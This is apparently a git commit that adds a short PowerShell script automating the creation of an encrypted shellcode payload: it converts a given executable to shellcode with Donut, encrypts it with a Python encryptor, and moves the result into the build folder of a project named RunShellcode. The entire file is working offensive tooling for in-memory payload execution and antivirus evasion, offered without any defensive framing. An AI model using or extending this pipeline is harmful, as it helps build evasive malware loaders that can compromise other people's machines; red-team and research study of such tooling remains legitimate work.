2f3a3519d79220b03b2d44a6769ec94b8af7d44e
ascemama <antoine.scemama@yahoo.com>
2022-06-17 16:24:43 +0800

    add deploy script to automate encr. pld creation

---
+++ deploy.ps1
@@ -0,0 +1,22 @@
+# 1. Take an .exe as input
+# 2. create payload with Donut
+# 3. encrypt this payload
+# 4. place the encrypted payload in the target dictory (where the final app will use it)
+
+param (
+    [string]$AppArgs = "",
+    [Parameter(Mandatory=$true)][string]$AppPath,
+    [string]$DonutPath = "C:\Users\antoine\source\repos\donut-master-v0-9-1\donut.exe",
+    [string]$CopyPayloadTo = "C:\Users\antoine\source\repos\RunShellcode\x64\Debug",
+    [string]$EncPath = "C:\Users\antoine\source\repos\ShellcodeStubTemplate\encryptor.py"
+ )
+ 
+if (!$AppArgs){
+    Invoke-Expression -Command "$DonutPath  -f $AppPath -a 2" 
+    }
+else {
+     Invoke-Expression -Command "$DonutPath  -f $AppPath -a 2 -p $AppArgs" 
+    }
+
+Invoke-Expression -Command "python.exe $EncPath -f payload.bin -o enc_payload.bin "
+move-item   enc_payload.bin $CopyPayloadTo
